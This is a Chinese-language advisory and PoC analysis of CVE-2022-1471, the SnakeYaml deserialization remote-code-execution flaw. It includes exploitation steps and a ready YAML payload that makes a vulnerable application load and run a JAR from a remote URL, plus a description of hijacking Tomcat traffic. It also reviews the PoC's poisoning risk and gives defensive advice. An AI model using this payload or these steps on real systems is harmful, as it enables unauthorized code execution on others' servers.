## CVE-2022-1471 - SnakeYaml 反序列化漏洞导致远程代码执行 (RCE)

**漏洞编号:** CVE-2022-1471

**漏洞类型:** 反序列化漏洞导致远程代码执行 (RCE)

**影响应用:** SnakeYaml

**危害等级:** Critical

**CVSS评分:** 9.8 (CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**影响版本:** SnakeYaml应用中使用不安全反序列化方法的版本。已知受影响产品包括DynamoDB Local 1.21、2.0版本和openLooKeng/hetu-core 1.33.0版本。

**利用条件:** 应用程序使用SnakeYaml库对来自攻击者的、未经验证的YAML内容进行反序列化，特别是通过`Yaml.load()`等不安全方法。攻击者需要能够控制反序列化的输入数据。

**POC 可用性:** 9/10

**POC 类型:** 完整利用

**攻击复杂度:** 低

**投毒风险:** 10%

## 详情

CVE-2022-1471是一个关于SnakeYaml库的反序列化漏洞，其核心问题在于`Constructor()`类在反序列化期间不对可以实例化的类型进行限制。攻击者通过提供特制的YAML内容，能够诱导应用程序反序列化并实例化任意类，最终导致远程代码执行（RCE）。此漏洞在CVSS v3.0评分为9.8，属于严重（Critical）级别，攻击复杂度低。

**POC有效性分析**
该漏洞的POC代码，名为`yaml-payload`，是一个功能完整的利用工具，旨在演示如何通过SnakeYaml反序列化漏洞实现RCE。根据其README描述和提供的Java源代码，该POC通过以下复杂的攻击链工作：
1.  **恶意YAML Payload**: 攻击者构造的YAML payload形如`!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["<远程JAR路径>"]]]]`。
2.  **远程JAR加载**: 当受害者应用程序使用`Yaml.load()`等不安全方法反序列化此payload时，SnakeYaml会首先实例化一个`java.net.URL`对象，指向攻击者控制的远程服务器上托管的`yaml-payload.jar`。
3.  **`URLClassLoader`创建**: 随后，这个URL被包装进`java.net.URLClassLoader`，用于加载远程JAR文件中的类。
4.  **`ScriptEngineManager`触发**: `javax.script.ScriptEngineManager`利用Java的Service Provider Interface (SPI) 机制，在加载的远程JAR中查找并实例化`javax.script.ScriptEngineFactory`接口的实现类。POC中提供的实现是`artsploit.AwesomeScriptEngineFactory`。
5.  **恶意代码执行**: `AwesomeScriptEngineFactory`的构造函数被调用，其中包含精心设计的恶意代码。此代码利用Java反射机制，尝试向运行中的Spring Boot应用程序注入一个Tomcat Valve。一旦成功注入，所有发送到应用程序8080端口的请求都将被劫持，并被替换为一个“You've Been PWNED”的页面，从而直观地展示了RCE的成功。
6.  **备用利用路径**: 如果Tomcat Valve注入失败（例如，在非Spring或非Tomcat应用中），POC会回退到启动一个独立的HTTP服务器在端口9999上，并尝试自动创建ngrok隧道，以确保即使在不同环境下也能展示利用效果。
POC的构建和使用说明清晰，提供了完整的Java源代码，并声明已在macOS本地环境和GitHub Actions (Ubuntu) CI/CD管道中进行过测试。这表明该POC具备较高的可靠性和通用性。综合来看，该POC功能完整，利用链条清晰，能够有效地演示CVE-2022-1471漏洞的远程代码执行能力。

**利用步骤**
利用CVE-2022-1471漏洞进行攻击的典型步骤如下：
1.  **目标识别**: 攻击者需要识别那些使用SnakeYaml库且对用户提供的数据执行不安全反序列化的应用程序。特别关注那些使用`Yaml.load()`等方法的应用接口。
2.  **Payload准备**: 攻击者需要准备一个恶意的YAML payload。此payload将指示目标系统加载并执行远程恶意JAR文件中的代码。例如，POC中使用的payload为：
    ```yaml
    !!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["https://raw.githubusercontent.com/seal-sec-demo-2/yaml-payload/main/yaml-payload.jar"]]]]
    ```
    攻击者需要将`https://raw.githubusercontent.com/seal-sec-demo-2/yaml-payload/main/yaml-payload.jar`替换为自己控制的恶意JAR文件的URL。
3.  **Payload传递**: 攻击者将此恶意YAML payload作为输入数据发送给目标应用程序的反序列化接口。例如，通过HTTP POST请求将payload嵌入到某个参数值中，或者通过其他数据输入渠道。
4.  **漏洞触发**: 目标应用程序接收到恶意YAML数据后，如果其使用了不安全的SnakeYaml反序列化方法，则会解析该payload。在解析过程中，`ScriptEngineManager`将利用`URLClassLoader`加载远程JAR文件。
5.  **远程代码执行**: 远程JAR文件中的`AwesomeScriptEngineFactory`类被实例化，其构造函数中的恶意代码将被执行。这些代码会根据环境尝试注入Tomcat Valve以劫持Web流量，或启动一个独立的Web服务器来展示利用成功。
6.  **效果验证**: 攻击者通过访问目标应用程序的受影响服务或观察特定的输出，来验证RCE是否成功。POC通过显示“You've Been PWNED”页面来明确指示成功利用。

**投毒风险分析**
对该POC的投毒风险评估为低，约为10%。主要基于以下分析：
1.  **代码透明性与目的**: 该POC的源代码（`AwesomeScriptEngineFactory.java`）是公开的，并且其README文件清晰地解释了攻击链和预期行为。代码的主要逻辑是利用反射机制注入Tomcat Valve或启动本地HTTP服务器，以实现直观的“You've Been PWNED”效果，这些行为完全符合一个漏洞演示POC的范畴。这些是证明RCE存在的“后门代码”，而非隐蔽的恶意投毒代码。
2.  **远程JAR加载机制**: POC通过`java.net.URLClassLoader`从远程GitHub Raw URL加载`yaml-payload.jar`。虽然源代码已提供，理论上可以在本地编译并使用，但默认的攻击向量是远程加载。这种远程加载本身带来了一定的供应链安全风险：如果POC作者的GitHub账户被攻陷，或者GitHub Raw服务被恶意篡改，那么加载的JAR文件可能会被替换为真正的恶意Payload，例如勒索软件、挖矿程序或持久性后门。然而，这种风险是外部环境导致，而非POC代码本身所含的恶意逻辑。
3.  **无混淆或隐蔽行为**: 审查`AwesomeScriptEngineFactory.java`代码，没有发现明显的代码混淆、难以理解的逻辑、或与未知C2服务器通信的加密通道。所使用的API均属于Java标准库和Tomcat内部API，其行为与其声明的演示目的相符。没有发现尝试窃取敏感数据、安装持久性后门（超出演示目的的劫持页面）、进行加密货币挖掘等超出演示范围的恶意行为。
4.  **建议与预防**: 尽管该POC本身的直接投毒风险较低，但任何涉及远程代码加载的机制都应引起警惕。在分析和使用此类POC时，防御性安全研究员应始终在隔离、受控的环境中进行，并建议：
    *   审查所有远程加载资源的完整性和来源，最好在本地编译和托管相关Payload。
    *   通过网络流量分析，监控POC执行期间的所有外部连接，确保没有意外的数据外泄或与其他未知服务器的通信。
    *   在模拟环境中验证漏洞，而非直接在生产环境或敏感测试环境中运行。
总而言之，该POC是用于合法防御性安全研究的有效工具，其自身没有发现故意投毒的意图或隐藏的恶意功能，其远程加载机制是其演示设计的一部分，但仍需使用者在安全可控的环境下谨慎操作。

**项目地址:** https://github.com/seal-sec-demo-2/yaml-payload

**漏洞详情:** https://nvd.nist.gov/vuln/detail/CVE-2022-1471
